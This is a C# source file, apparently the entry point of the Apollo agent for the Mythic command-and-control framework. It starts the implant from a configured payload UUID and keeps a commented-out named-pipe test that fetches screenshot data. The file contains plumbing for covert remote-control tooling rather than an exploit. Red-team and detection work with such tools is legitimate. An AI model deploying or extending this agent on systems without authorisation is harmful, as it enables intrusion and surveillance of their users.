using System;
using PSKCryptography;
using HttpTransport;
using ApolloInterop.Serializers;
using System.Collections.Generic;
using ApolloInterop.Structs.MythicStructs;
using Apollo.Agent;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using System.Text;
using System.Threading;
using Apollo.Peers.SMB;
using System.Linq;
using System.Collections.Concurrent;
using System.Runtime.InteropServices;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Enums.ApolloEnums;

namespace Apollo
{
    class Program
    {
        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> _receiverQueue = new ConcurrentQueue<IMythicMessage>();
        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private static AutoResetEvent _connected = new AutoResetEvent(false);
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static PipeStream ps;
        static void Main(string[] args)
        {
            //IPCCommandArguments cmdargs = new IPCCommandArguments
            //{
            //    ByteData = new byte[0],
            //    StringData = "1 0"
            //};

            //AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", "screenshottest");
            //client.ConnectionEstablished += Client_ConnectionEstablished;
            //client.MessageReceived += OnAsyncMessageReceived;
            //client.Disconnect += Client_Disconnect;

            //if (client.Connect(3000))
            //{
            //    IPCChunkedData[] chunks = _jsonSerializer.SerializeIPCMessage(cmdargs);
            //    foreach (IPCChunkedData chunk in chunks)
            //    {
            //        byte[] b = Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(chunk));
            //        ps.BeginWrite(b, 0, b.Length, OnAsyncMessageSent, ps);
            //    }
            //    for(int i = 0; i < 1; i++)
            //    {
            //        _receiverEvent.WaitOne();
            //        if (_receiverQueue.TryDequeue(out IMythicMessage screenshotData))
            //        {
            //            if (screenshotData.GetTypeCode() != MessageType.ScreenshotInformation)
            //            {
            //                throw new Exception("Invalid type received from the named pipe!");
            //            }
            //            Console.WriteLine();
            //        }
            //    }
            //}

            // This is main execution.
            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
            ap.Start();
        }

        private static void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
        }

        private static void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            ps = e.Pipe;
        }

        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected)
            {
                pipe.EndWrite(result);
            }
        }

        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _receiverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }
    }
}
